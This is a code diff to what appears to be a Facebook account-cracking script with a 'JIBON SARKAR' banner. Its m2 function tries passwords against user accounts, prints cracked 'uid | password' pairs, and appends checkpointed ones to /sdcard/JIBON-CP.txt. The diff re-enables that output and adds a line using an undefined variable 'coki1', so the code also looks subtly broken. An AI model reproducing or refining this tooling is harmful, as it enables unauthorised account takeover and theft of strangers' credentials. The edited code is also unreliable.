@@ -222,7 +222,7 @@ logo = ("""
 \x1b[1;96m.o. 88P o888o o888bood8P'   `Y8bood8P'  o8o        `8
 \x1b[1;96m`Y888P
 \033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96JIBON SARKAR                 \033[38;5;46m┃
+\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96JIBON SARKAR                \033[38;5;46m┃
 \033[38;5;46m┃ \x1b[1;96m√FREE    \x1b[38;5;196m: \033[33;1mTOOL                      \033[38;5;46m┃
 \033[38;5;46m┃ \033[33;1m√NETWORK \x1b[38;5;196m: \x1b[38;5;196m3G 4G                     \033[38;5;46m┃
 \033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┫
@@ -437,7 +437,7 @@ def m2(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                idf = coki[65:80]
+                uid = "1000"+coki1[0:11]
                 print(f'\r\33[1;92m [JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
               #  print(f'\r\33[35;1m [COOKIES] '+coki)
            #     cek_apk(session,coki)                
@@ -447,7 +447,7 @@ def m2(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 idf = coki[82:97]
-                #print(f"\33[1;91m[JIBON-CP] {uid} | {ps}")
+                print(f"\33[1;91m[JIBON-CP] {uid} | {ps}")
                 open('/sdcard/JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
